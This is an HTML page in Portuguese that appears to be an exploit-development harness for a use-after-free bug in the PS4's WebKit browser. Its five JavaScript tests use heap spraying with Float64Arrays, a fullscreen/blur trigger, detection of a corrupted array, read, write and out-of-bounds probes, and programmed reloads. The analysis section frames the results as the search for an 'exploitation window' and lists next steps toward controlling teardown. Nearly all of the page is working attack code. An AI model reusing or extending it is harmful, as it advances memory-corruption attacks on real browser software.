<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Controlled Reload</title>
</head>
<body>

<h1>PS4 WebKit UAF - Controlled Reload Analysis</h1>

<h2>ESTRATÉGIA</h2>
<p>Ao invés de apertar ATUALIZAR, vamos usar JavaScript para:</p>
<ol>
<li>Capturar estado ANTES do reload</li>
<li>Executar operações incrementais</li>
<li>Triggerar reload PROGRAMATICAMENTE</li>
<li>Interceptar com timers e logs</li>
</ol>

<hr>

<h2>TESTE 1: Reload Programático com Delay</h2>
<p>Executa operações antes de triggerar location.reload()</p>
<button onclick="runReloadTest1()">EXECUTAR TESTE 1</button>
<div id="result1"></div>

<script>
function runReloadTest1() {
    const result = document.getElementById('result1');
    result.innerHTML = '<h3>TESTE 1: Delayed Reload</h3>';
    result.innerHTML += '<p>Aperte OPTIONS para iniciar UAF</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - executando UAF</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO!</h3>';
        result.innerHTML += '<p>Iniciando sequência de testes com delays...</p>';
        
        // Sequência de testes com delays
        let testResults = [];
        
        setTimeout(() => {
            result.innerHTML += '<p>[1s] Teste 1: Lendo corrupted[0]...</p>';
            try {
                const val = corrupted[0];
                result.innerHTML += '<p>SUCCESS: ' + val + '</p>';
                testResults.push('Test1: SUCCESS');
            } catch(e) {
                result.innerHTML += '<p>ERRO: ' + e.message + '</p>';
                testResults.push('Test1: FAIL - ' + e.message);
            }
        }, 1000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[2s] Teste 2: Escrevendo em corrupted[2]...</p>';
            try {
                corrupted[2] = 0xDEADBEEF;
                const val = corrupted[2];
                result.innerHTML += '<p>SUCCESS: Escrito e lido ' + val.toString(16) + '</p>';
                testResults.push('Test2: SUCCESS');
            } catch(e) {
                result.innerHTML += '<p>ERRO: ' + e.message + '</p>';
                testResults.push('Test2: FAIL - ' + e.message);
            }
        }, 2000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[3s] Teste 3: Loop de leitura 0-7...</p>';
            try {
                for(let i = 0; i < 8; i++) {
                    const val = corrupted[i];
                }
                result.innerHTML += '<p>SUCCESS: Todos os offsets legíveis</p>';
                testResults.push('Test3: SUCCESS');
            } catch(e) {
                result.innerHTML += '<p>ERRO: ' + e.message + '</p>';
                testResults.push('Test3: FAIL - ' + e.message);
            }
        }, 3000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[4s] Teste 4: Limpando referências locais...</p>';
            try {
                controllers = null;
                spray = null;
                result.innerHTML += '<p>SUCCESS: Referências locais limpas</p>';
                testResults.push('Test4: SUCCESS');
            } catch(e) {
                result.innerHTML += '<p>ERRO: ' + e.message + '</p>';
                testResults.push('Test4: FAIL - ' + e.message);
            }
        }, 4000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[5s] Teste 5: Testando corrupted após limpeza...</p>';
            try {
                const val = corrupted[0];
                result.innerHTML += '<p>SUCCESS: Array ainda acessível: ' + val + '</p>';
                testResults.push('Test5: SUCCESS');
            } catch(e) {
                result.innerHTML += '<p>ERRO: ' + e.message + '</p>';
                testResults.push('Test5: FAIL - ' + e.message);
            }
        }, 5000);
        
        // RELOAD PROGRAMÁTICO
        setTimeout(() => {
            result.innerHTML += '<h3 style="color:red;">[6s] INICIANDO RELOAD PROGRAMÁTICO</h3>';
            result.innerHTML += '<p>Resultados dos testes:</p>';
            result.innerHTML += '<pre>' + testResults.join('\n') + '</pre>';
            result.innerHTML += '<p>Tentando acessar array uma última vez...</p>';
            
            try {
                const finalVal = corrupted[0];
                result.innerHTML += '<p>Array acessível antes do reload: ' + finalVal + '</p>';
            } catch(e) {
                result.innerHTML += '<p style="color:red;">Array inacessível: ' + e.message + '</p>';
            }
            
            result.innerHTML += '<p style="color:yellow;font-weight:bold;">RELOAD EM 2 SEGUNDOS...</p>';
            
            setTimeout(() => {
                location.reload();
            }, 2000);
            
        }, 6000);
    };
}
</script>

<hr>

<h2>TESTE 2: Reload com Múltiplas Tentativas</h2>
<p>Tenta múltiplas operações incrementais antes de reload</p>
<button onclick="runReloadTest2()">EXECUTAR TESTE 2</button>
<div id="result2"></div>

<script>
function runReloadTest2() {
    const result = document.getElementById('result2');
    result.innerHTML = '<h3>TESTE 2: Incremental Operations</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Testando operações incrementais</h3>';
        
        let operationLog = [];
        let currentOp = 0;
        
        const operations = [
            {
                name: 'Read offset 0',
                fn: () => corrupted[0]
            },
            {
                name: 'Read offset 1',
                fn: () => corrupted[1]
            },
            {
                name: 'Read offset 7',
                fn: () => corrupted[7]
            },
            {
                name: 'Read offset 8 (OOB)',
                fn: () => corrupted[8]
            },
            {
                name: 'Write offset 0',
                fn: () => { corrupted[0] = 0x1111; return corrupted[0]; }
            },
            {
                name: 'Write offset 7',
                fn: () => { corrupted[7] = 0x7777; return corrupted[7]; }
            },
            {
                name: 'Create new Float64Array',
                fn: () => { let x = new Float64Array(8); return x.length; }
            },
            {
                name: 'Loop read 0-15',
                fn: () => { 
                    for(let i = 0; i < 16; i++) corrupted[i];
                    return 'OK';
                }
            },
            {
                name: 'Write then read offset 5',
                fn: () => { 
                    corrupted[5] = 0xCAFEBABE;
                    return corrupted[5];
                }
            },
            {
                name: 'Clear local refs',
                fn: () => {
                    controllers = null;
                    spray = null;
                    return 'Cleared';
                }
            },
            {
                name: 'Post-clear read',
                fn: () => corrupted[0]
            },
            {
                name: 'Create 1000 new arrays',
                fn: () => {
                    for(let i = 0; i < 1000; i++) {
                        let x = new Array(10);
                    }
                    return 'Created';
                }
            }
        ];
        
        function runNextOperation() {
            if (currentOp >= operations.length) {
                result.innerHTML += '<h3 style="color:green;">TODAS AS OPERAÇÕES COMPLETAS!</h3>';
                result.innerHTML += '<h4>Log de Operações:</h4>';
                result.innerHTML += '<pre>' + operationLog.join('\n') + '</pre>';
                result.innerHTML += '<p style="color:yellow;">Reload em 3 segundos...</p>';
                
                setTimeout(() => {
                    location.reload();
                }, 3000);
                return;
            }
            
            const op = operations[currentOp];
            result.innerHTML += '<p>[Op ' + (currentOp + 1) + '] ' + op.name + '...</p>';
            
            try {
                const opResult = op.fn();
                result.innerHTML += '<p style="color:green;">  SUCCESS: ' + opResult + '</p>';
                operationLog.push('[' + (currentOp + 1) + '] ' + op.name + ': SUCCESS (' + opResult + ')');
            } catch(e) {
                result.innerHTML += '<p style="color:red;">  ERRO: ' + e.message + '</p>';
                operationLog.push('[' + (currentOp + 1) + '] ' + op.name + ': FAIL (' + e.message + ')');
            }
            
            currentOp++;
            setTimeout(runNextOperation, 500);
        }
        
        setTimeout(runNextOperation, 1000);
    };
}
</script>

<hr>

<h2>TESTE 3: Reload com Captura de Estado</h2>
<p>Salva estado completo antes de reload e recupera após</p>
<button onclick="runReloadTest3()">EXECUTAR TESTE 3</button>
<div id="result3"></div>

<script>
function runReloadTest3() {
    const result = document.getElementById('result3');
    
    // Verificar se há estado salvo de reload anterior
    const savedState = sessionStorage.getItem('uaf_state');
    
    if (savedState) {
        result.innerHTML = '<h3>ESTADO RECUPERADO DE RELOAD ANTERIOR!</h3>';
        const state = JSON.parse(savedState);
        
        result.innerHTML += '<h4>Timestamp do UAF: ' + new Date(state.timestamp).toLocaleTimeString() + '</h4>';
        result.innerHTML += '<h4>Operações realizadas antes do reload:</h4>';
        result.innerHTML += '<pre>' + JSON.stringify(state.operations, null, 2) + '</pre>';
        
        result.innerHTML += '<h4>Valores capturados do array corrompido:</h4>';
        result.innerHTML += '<pre>' + JSON.stringify(state.corruptedValues, null, 2) + '</pre>';
        
        result.innerHTML += '<h4>Crash Info:</h4>';
        result.innerHTML += '<p>Reload foi triggado? ' + state.reloadTriggered + '</p>';
        result.innerHTML += '<p>Última operação: ' + state.lastOperation + '</p>';
        
        result.innerHTML += '<p style="color:yellow;">Estado recuperado com sucesso!</p>';
        result.innerHTML += '<p>Limpe sessionStorage e execute novamente para novo teste</p>';
        
        return;
    }
    
    result.innerHTML = '<h3>TESTE 3: State Capture</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Capturando estado</h3>';
        
        let captureState = {
            timestamp: Date.now(),
            operations: [],
            corruptedValues: [],
            lastOperation: '',
            reloadTriggered: false
        };
        
        // Capturar valores do array
        result.innerHTML += '<p>Capturando valores do array corrompido...</p>';
        for(let i = 0; i < 32; i++) {
            try {
                const val = corrupted[i];
                const buf = new ArrayBuffer(8);
                const fview = new Float64Array(buf);
                const iview = new BigUint64Array(buf);
                fview[0] = val;
                
                captureState.corruptedValues.push({
                    offset: i,
                    float: val,
                    hex: '0x' + iview[0].toString(16).padStart(16, '0')
                });
            } catch(e) {
                captureState.corruptedValues.push({
                    offset: i,
                    error: e.message
                });
            }
        }
        
        result.innerHTML += '<p>Capturados ' + captureState.corruptedValues.length + ' offsets</p>';
        
        // Executar operações de teste
        setTimeout(() => {
            result.innerHTML += '<p>[1s] Operação: Write test</p>';
            try {
                corrupted[3] = 0xAAAABBBB;
                captureState.operations.push({time: Date.now(), op: 'Write offset 3', result: 'SUCCESS'});
                captureState.lastOperation = 'Write offset 3';
            } catch(e) {
                captureState.operations.push({time: Date.now(), op: 'Write offset 3', result: 'FAIL: ' + e.message});
            }
        }, 1000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[2s] Operação: Read loop</p>';
            try {
                for(let i = 0; i < 8; i++) {
                    const v = corrupted[i];
                }
                captureState.operations.push({time: Date.now(), op: 'Read loop 0-7', result: 'SUCCESS'});
                captureState.lastOperation = 'Read loop 0-7';
            } catch(e) {
                captureState.operations.push({time: Date.now(), op: 'Read loop 0-7', result: 'FAIL: ' + e.message});
            }
        }, 2000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[3s] Operação: Clear refs</p>';
            try {
                controllers = null;
                spray = null;
                captureState.operations.push({time: Date.now(), op: 'Clear refs', result: 'SUCCESS'});
                captureState.lastOperation = 'Clear refs';
            } catch(e) {
                captureState.operations.push({time: Date.now(), op: 'Clear refs', result: 'FAIL: ' + e.message});
            }
        }, 3000);
        
        // Salvar estado e reload
        setTimeout(() => {
            result.innerHTML += '<h3 style="color:orange;">[4s] SALVANDO ESTADO E RELOADING</h3>';
            
            captureState.reloadTriggered = true;
            captureState.lastOperation = 'About to reload';
            
            try {
                sessionStorage.setItem('uaf_state', JSON.stringify(captureState));
                result.innerHTML += '<p>Estado salvo em sessionStorage</p>';
            } catch(e) {
                result.innerHTML += '<p>ERRO ao salvar: ' + e.message + '</p>';
            }
            
            result.innerHTML += '<p style="color:yellow;">RELOAD EM 2 SEGUNDOS...</p>';
            
            setTimeout(() => {
                location.reload();
            }, 2000);
            
        }, 4000);
    };
}
</script>

<hr>

<h2>TESTE 4: Reload SEM Limpar Array</h2>
<p>Mantém array corrompido e reloada - teste de crash isolado</p>
<button onclick="runReloadTest4()">EXECUTAR TESTE 4</button>
<div id="result4"></div>

<script>
function runReloadTest4() {
    const result = document.getElementById('result4');
    result.innerHTML = '<h3>TESTE 4: Reload with Active Corruption</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    // Guardar referência global
    window.globalCorrupted = null;
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                window.globalCorrupted = corrupted;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO</h3>';
        result.innerHTML += '<p>Array corrompido guardado em window.globalCorrupted</p>';
        result.innerHTML += '<p>NÃO vamos limpar nenhuma referência</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p>[2s] Verificando array antes do reload...</p>';
            try {
                const val = window.globalCorrupted[0];
                result.innerHTML += '<p>Array acessível: [0] = ' + val + '</p>';
            } catch(e) {
                result.innerHTML += '<p>ERRO: ' + e.message + '</p>';
            }
        }, 2000);
        
        setTimeout(() => {
            result.innerHTML += '<h3 style="color:red;">[4s] RELOAD COM ARRAY CORROMPIDO ATIVO</h3>';
            result.innerHTML += '<p>Se crashar, é porque o array corrompido causa problema no teardown</p>';
            result.innerHTML += '<p style="color:yellow;">RELOAD EM 1 SEGUNDO...</p>';
            
            setTimeout(() => {
                location.reload();
            }, 1000);
            
        }, 4000);
    };
}
</script>

<hr>

<h2>TESTE 5: Reload DEPOIS de Limpar Tudo</h2>
<p>Limpa completamente antes de reload - teste se crash persiste</p>
<button onclick="runReloadTest5()">EXECUTAR TESTE 5</button>
<div id="result5"></div>

<script>
function runReloadTest5() {
    const result = document.getElementById('result5');
    result.innerHTML = '<h3>TESTE 5: Clean Before Reload</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        let corruptedIdx = -1;
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                corruptedIdx = i;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Iniciando limpeza completa</h3>';
        
        setTimeout(() => {
            result.innerHTML += '<p>[1s] Passo 1: Zerando array corrompido...</p>';
            try {
                for(let i = 0; i < 8; i++) {
                    corrupted[i] = 0;
                }
                result.innerHTML += '<p>Array zerado</p>';
            } catch(e) {
                result.innerHTML += '<p>ERRO ao zerar: ' + e.message + '</p>';
            }
        }, 1000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[2s] Passo 2: Removendo do array controllers...</p>';
            controllers[corruptedIdx] = null;
            result.innerHTML += '<p>Removido</p>';
        }, 2000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[3s] Passo 3: Limpando variável corrupted...</p>';
            corrupted = null;
            result.innerHTML += '<p>Limpo</p>';
        }, 3000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[4s] Passo 4: Limpando arrays...</p>';
            controllers = null;
            spray = null;
            result.innerHTML += '<p>Arrays limpos</p>';
        }, 4000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[5s] Passo 5: Forçando GC...</p>';
            for(let i = 0; i < 1000; i++) {
                let trash = new Array(100);
            }
            result.innerHTML += '<p>GC forçado</p>';
        }, 5000);
        
        setTimeout(() => {
            result.innerHTML += '<h3 style="color:green;">[6s] LIMPEZA COMPLETA</h3>';
            result.innerHTML += '<p>Todas as referências removidas</p>';
            result.innerHTML += '<p>Array corrompido zerado</p>';
            result.innerHTML += '<p style="color:yellow;">Se AINDA crashar no reload, o problema é mais profundo</p>';
            result.innerHTML += '<p style="color:yellow;">RELOAD EM 2 SEGUNDOS...</p>';
            
            setTimeout(() => {
                location.reload();
            }, 2000);
            
        }, 6000);
    };
}
</script>

<hr>

<h2>ANÁLISE DOS RESULTADOS</h2>

<h3>O Que Cada Teste Revela:</h3>

<p><b>TESTE 1 (Delayed Reload):</b></p>
<ul>
<li>Se passar todos os testes: Array é estável até o reload</li>
<li>Se falhar em algum: Identifica quando array se corrompe</li>
<li>Reload acontece 8 segundos após UAF</li>
</ul>

<p><b>TESTE 2 (Incremental Operations):</b></p>
<ul>
<li>12 operações diferentes executadas sequencialmente</li>
<li>Identifica EXATAMENTE qual operação é segura</li>
<li>Log completo antes do reload</li>
</ul>

<p><b>TESTE 3 (State Capture):</b></p>
<ul>
<li>SALVA estado em sessionStorage</li>
<li>Após reload, RECUPERA e mostra os dados</li>
<li>Permite análise POST-CRASH</li>
<li><b>EXECUTE DUAS VEZES</b> (primeira salva, segunda mostra)</li>
</ul>

<p><b>TESTE 4 (No Clean Reload):</b></p>
<ul>
<li>Mantém array corrompido ATIVO durante reload</li>
<li>Se crashar: Confirma que array corrompido causa o crash</li>
<li>Se NÃO crashar: Array não é o problema!</li>
</ul>

<p><b>TESTE 5 (Clean Before Reload):</b></p>
<ul>
<li>Limpa TUDO antes do reload</li>
<li>Se crashar: Problema é interno do WebKit, não controlável</li>
<li>Se NÃO crashar: <b>CRITICAL!</b> Podemos prevenir o crash!</li>
</ul>

<h3>Comparação Crítica:</h3>
<table border="1">
<tr>
<th>Teste</th>
<th>Se Crasha</th>
<th>Se NÃO Crasha</th>
</tr>
<tr>
<td>Teste 4 (No Clean)</td>
<td>Array corrompido é o problema</td>
<td>Array não causa crash</td>
</tr>
<tr>
<td>Teste 5 (Clean)</td>
<td>Problema interno do WebKit</td>
<td><b>EXPLOITÁVEL!</b> Limpeza previne crash</td>
</tr>
</table>

<hr>

<h2>PRÓXIMOS PASSOS BASEADOS NOS RESULTADOS</h2>

<p><b>Se TESTE 5 NÃO crashar:</b></p>
<ol>
<li>Sabemos que limpeza manual previne crash</li>
<li>Podemos controlar o teardown</li>
<li>Janela de exploração identificada</li>
<li>Próximo passo: Manipular estado ANTES da limpeza</li>
</ol>

<p><b>Se TESTE 3 salvar dados:</b></p>
<ol>
<li>Execute TESTE 3 novamente</li>
<li>Veja dados recuperados</li>
<li>Analise valores capturados</li>
<li>Compare com valores esperados</li>
</ol>

<p><b>Se TESTE 2 completar todas operações:</b></p>
<ol>
<li>Array é totalmente estável</li>
<li>Crash é puramente no teardown</li>
<li>Focar em manipular estado de teardown</li>
</ol>

<hr>

<p><b>IMPORTANTE:</b> Execute os testes NA ORDEM e anote:</p>
<ul>
<li>Qual teste crashou</li>
<li>Qual teste NÃO crashou (se houver)</li>
<li>Mensagens de erro capturadas</li>
<li>Última operação antes do crash</li>
</ul>

<p>Essas informações são CRÍTICAS para identificar se há janela de exploração!</p>

</body>
</html>
